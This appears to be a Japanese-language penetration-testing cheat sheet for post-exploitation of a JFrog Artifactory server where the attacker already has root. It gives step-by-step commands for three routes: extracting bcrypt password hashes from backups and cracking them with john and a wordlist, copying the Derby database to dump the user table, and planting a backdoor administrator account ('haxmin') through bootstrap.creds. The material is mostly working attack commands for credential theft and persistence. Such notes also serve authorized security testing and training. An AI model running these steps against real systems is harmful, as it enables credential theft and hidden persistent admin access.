# enum
artifactoryがいるか確認
```sh
pas aux | grep artifactory
```

# 経路1: Backupの侵害
サーバーへのルートアクセス権は持っているが、Artifactoryの認証情報を持っていない状況についてバックアップからパスワードを取得

バックアップフォルダのパス
```
/<ARTIFACTORY FOLDER>/var/backup/access
```

ユーザのパスワード情報がbcrypt形式で保存されている
例：
```json
...
{
    "username" : "developer",
    "firstName" : null,
    "lastName" : null,
    "email" : "developer@corp.local",
    "realm" : "internal",
    "status" : "enabled",
    "lastLoginTime" : 0,
    "lastLoginIp" : null,
    "password" : "bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm",
    "allowedIps" : [ "*" ],
    "created" : 1591715957889,
    "modified" : 1591715957889,
    "failedLoginAttempts" : 0,
    "statusLastModified" : 1591715957889,
    "passwordLastModified" : 1591715957889,
    "customData" : {
      "updatable_profile" : {
        "value" : "true",
        "sensitive" : false
      }
...
```

ホストにコピーしてオフラインクラック
```sh
echo "$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm" > derbyhash.txt
```

kaliで解読
```sh
sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```


# 経路2:データベースの侵害
バックアップファイルがない場合は、データベース自体にアクセスするか、データベースをコピーしてハッシュを手動で抽出

データベースのパス
```
/<ARTIFACTORY FOLDER>/var/data/access/derby
```

データベースは起動中ロックがかかっているのでコピー
```sh
mkdir /tmp/hackeddb
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
sudo chmod 755 /tmp/hackeddb/derby
sudo rm /tmp/hackeddb/derby/*.lck
```

Derby接続ユーティリティの実行
```
sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
connect 'jdbc:derby:/tmp/hackeddb/derby';
```

SQLでユーザを一覧表示
```
select * from access_users;
```

# 経路3:セカンダリ管理者アカウント追加
管理者アカウントが破損した場合、または管理者がシステムへのアクセス権を失った場合、Artifactoryは管理者権限を取得するための代替手段を提供してる

### 前提
- **/opt/jfrog/artifactory/var/etc/access**フォルダへの書き込み権限
- 新しく作成されたファイルのパーミッションを変更する権限
- まとめるとroot or sudo権限あればよい

バックドア管理者アカウント（haxmin)追加。パスワードはhaxhaxhax
```sh
cd /opt/jfrog/artifactory/var/etc/access
sudo su
echo "haxmin@*=haxhaxhax" > bootstrap.creds
```

パーミッションを600に変更
```sh
sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
```

Artifactory再起動
```sh
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
```

確認方法
```sh
sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log
```

